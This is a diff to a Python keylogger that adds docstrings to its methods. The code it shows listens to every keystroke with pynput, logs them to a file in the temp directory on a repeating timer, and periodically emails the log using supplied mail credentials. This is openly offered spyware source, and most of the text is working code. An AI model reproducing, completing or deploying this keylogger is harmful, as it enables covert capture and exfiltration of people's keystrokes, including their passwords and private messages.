@@ -24,7 +24,22 @@ import tempfile
 
 
 class Keylogger:
+    r""" This class has following methods >>>
+         - __init__ : It is the constructor method. It initialises file writing interval time, mail id username, mail id password and mailing interval time.
+         - append_to_log : This method appends new key strokes to the log.
+         - process_key_pressed : This method catches the key strokes pressed on the keyboard.
+         - send_mail : This method sends the file to the email id passed in the parameter.
+         - report : This method writes the key strokes to a file.
+         - start : This method starts the keyboard listener.
+    """
     def __init__(self, interval, username, password, mail_interval):
+        r"""It is the constructor method. It initialises file writing interval time, mail id username, mail id password and mailing interval time.
+            It accepts 4 parameters >>>
+            :param interval: file writing interval time
+            :param username: mail id username
+            :param password: mail id password
+            :param mail_interval:  mailing interval time
+        """
         temp_dir = tempfile.gettempdir()
         os.chdir(temp_dir)
         self.log = "\t\t\tKey logger Started !!!\n\n"
@@ -35,9 +50,17 @@ class Keylogger:
         self.report()
 
     def append_to_log(self, string):
+        r""" This method appends new key strokes to the log. It accepts a string parameter.
+        :param string: key stroke passed as string
+        :return: NONE
+        """
         self.log = self.log + string
 
     def process_key_pressed(self,key):
+        r""" This method catches the key strokes pressed on the keyboard.
+        :param key: key strokes caugth by the keyboard listener.
+        :return: NONE
+        """
         try:
             current_key = str(key.char)
         except AttributeError:
@@ -48,6 +71,11 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def send_mail(self, email, password):
+        r""" This method sends the file to the email id passed in the arguments. It has recursive calling using threads.
+        :param email: mail id for sending the key stroke file
+        :param password: password of the mail id
+        :return: NONE
+        """
         try:
             with open("zlog.txt","r") as zlog:
                 message = "\n\n\n" + zlog.read()
@@ -64,6 +92,9 @@ class Keylogger:
             pass
 
     def report(self):
+        r""" This method writes the key strokes to a file. It has recursive calling using threads.
+        :return: NONE
+        """
         with open("zlog.txt","a") as zlog:
             zlog.write(self.log)
             self.log = ""
@@ -72,11 +103,17 @@ class Keylogger:
         timer.start()
     
     def start(self):
+        r""" This method starts the keyboard listener. It calls back following functions >>>
+             - report : This method writes the key strokes to a file.
+             - send_mail : This method sends the file to the email id passed in the parameter.
+        :return: NONE
+        """
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_pressed)
         with keyboard_listener:
             self.report()
             self.send_mail(self.username, self.password)
             keyboard_listener.join()
+
 
 
 interval = int(input("File writing interval   :   "))
